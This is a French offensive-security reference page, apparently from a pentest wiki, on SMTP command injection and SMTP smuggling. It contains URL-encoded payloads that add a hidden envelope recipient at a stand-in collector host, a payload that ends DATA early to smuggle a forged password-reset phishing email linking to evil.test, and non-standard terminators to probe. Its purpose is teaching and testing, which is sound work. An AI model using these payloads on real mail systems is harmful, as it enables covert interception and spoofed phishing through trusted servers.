---
title: "Injection de segment SMTP : injecter dans la conversation SMTP brute"
description: "Là où une application parle du SMTP brut, injecter dans MAIL FROM, RCPT TO ou DATA pour ajouter des destinataires, réécrire l'enveloppe, ou terminer DATA prématurément avec un point isolé et faire passer en fraude un second message."
keywords:
  - injection SMTP
  - injection de commande SMTP
  - SMTP smuggling
  - MAIL FROM
  - RCPT TO
  - smuggling de message
---

# Injection de segment SMTP

Lorsqu'une application parle SMTP directement, construisant `MAIL FROM`, `RCPT TO`, ou le payload `DATA` à partir d'entrée utilisateur, un `CRLF` dans cette entrée termine la ligne SMTP courante et laisse l'attaquant émettre ses propres commandes ou forger l'enveloppe. Contrairement à l'injection d'en-tête, qui manipule le message, celle-ci manipule la conversation de protocole entre l'application et son serveur de mail.

## La grammaire des commandes

SMTP est orienté ligne : chaque commande est une ligne terminée par `CRLF`. Une transaction exécute `MAIL FROM:<sender>`, un ou plusieurs `RCPT TO:<recipient>`, puis `DATA`, le message, et une ligne contenant uniquement un point unique (`.`) pour le terminer. Tout champ concaténé dans une de ces lignes sans retirer le `CRLF` laisse l'attaquant injecter la ligne suivante du dialogue.

## Ajouter des destinataires et réécrire l'enveloppe

Si un champ de destinataire ou d'expéditeur se déverse dans la ligne de commande, injectez un `CRLF` et un `RCPT TO` supplémentaire pour ajouter un destinataire caché au niveau de l'enveloppe, indépendamment de tout en-tête :

```
victim@corp.test%0d%0aRCPT TO:<collector@evil.test>
```

Le serveur accepte les deux destinataires ; le supplémentaire n'apparaît nulle part dans les en-têtes du message que le vrai destinataire voit. Injecter `MAIL FROM` réécrit l'expéditeur de l'enveloppe (l'adresse de bounce et la valeur que beaucoup de filtres évaluent pour SPF), laissant l'attaquant forger le return path tandis que l'en-tête `From:` visible reste intact.

## Terminer DATA prématurément et faire passer un second message en fraude

La primitive la plus forte est d'atteindre le payload `DATA`. Le message est terminé par les cinq octets `CRLF . CRLF` (`%0d%0a.%0d%0a`). Injecter cette séquence termine le message courant, ramène la session en mode commande, et laisse l'attaquant démarrer une toute nouvelle transaction sur la même connexion :

```
%0d%0a.%0d%0aMAIL FROM:<forged@corp.test>%0d%0aRCPT TO:<target@victim.test>%0d%0aDATA%0d%0aFrom: it@corp.test%0d%0aSubject: Password reset%0d%0a%0d%0aClick https://evil.test%0d%0a.%0d%0a
```

Le premier message se ferme au point injecté ; tout ce qui le suit est un second email entièrement rédigé par l'attaquant, envoyé depuis la connexion et l'IP de l'application de confiance.

## SMTP smuggling au niveau de la remise

Une désynchronisation connexe exploite le désaccord sur ce qui termine `DATA`. Le terminateur standard est `<CR><LF>.<CR><LF>`, mais certains serveurs acceptent aussi des variantes non standard telles qu'un `<LF>.<LF>`, `<CR>.<CR>`, ou `<LF>.<CR><LF>` nu. Lorsqu'un serveur sortant (émetteur) et un serveur entrant (récepteur) divergent sur quelles séquences comptent, un corps forgé que l'un traite comme des données et l'autre comme le marqueur de fin de données se scinde en deux messages à des points différents pour les deux hops. L'attaquant ajoute un message passé en fraude dont l'enveloppe est traitée séparément par le serveur récepteur, permettant du mail usurpé qui passe **SPF** pour le domaine d'expéditeur usurpé et donc DMARC via l'alignement SPF (le message est relayé par un serveur que le SPF du domaine usurpé autorise). DKIM n'est pas satisfait, puisque l'attaquant ne peut pas produire une signature valide pour le domaine usurpé, ce qui est exactement pourquoi les cibles sont des domaines qui passent DMARC sur SPF seul. Terminateurs candidats à sonder :

```
%0a.%0a
%0d.%0d
%0a.%0d%0a
```

## Notes de livraison

- Les octets injectés doivent survivre jusqu'à la ligne SMTP sous forme de vrais `CR`/`LF` ; depuis une requête web c'est `%0d%0a`, en JSON `\r\n`.
- Les adresses dans les commandes sont entourées de chevrons (`<addr>`) ; respectez la syntaxe attendue du serveur ou la commande injectée est rejetée.
- La tolérance au pipelining varie ; si le serveur rejette les commandes envoyées avant qu'il réponde, cadencez l'injection sur les réponses.
- Les destinataires d'enveloppe ajoutés via `RCPT TO` ne laissent aucune trace d'en-tête, ce qui rend ceci distinct d'un `Bcc:` ajouté par injection d'en-tête.

## Outils

- **swaks** : couteau suisse pour SMTP, scriptant des enveloppes et des payloads DATA forgés.
- **Burp Repeater** : injecter des payloads CRLF et de commande SMTP dans les champs de mail.
- **curl** : envoyer des payloads CRLF forgés dans les champs de composition de mail.
- Test manuel avec Burp Repeater et des payloads forgés.

## Références

- [OWASP: Testing for IMAP SMTP Injection (WSTG)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_IMAP_SMTP_Injection)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
